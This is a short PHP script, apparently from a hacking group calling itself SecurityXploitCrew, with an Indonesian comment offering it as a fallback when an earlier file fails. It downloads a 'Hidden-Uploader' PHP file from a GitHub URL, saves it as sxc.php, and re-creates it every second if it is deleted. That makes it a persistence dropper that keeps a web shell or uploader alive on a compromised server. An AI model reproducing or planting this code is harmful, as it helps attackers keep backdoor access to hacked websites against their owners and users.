<?php
//SecurityXploitCrew
//gunakan ini jika file sebelum nya tidak berfungsi dengan benar
$link="https://raw.githubusercontent.com/SecurityXploitcrew/Hidden-Uploader/main/uploader.php";
$file="sxc.php";
function shel($link,$file){
	$x=file_get_contents($link);
	$f=fopen($file,'w');
	fwrite($f,$x);
	fclose($f);
}
while(1){
	if(!file_exists($file)){
		shel($link,$file);
	}
sleep(1);
}
?>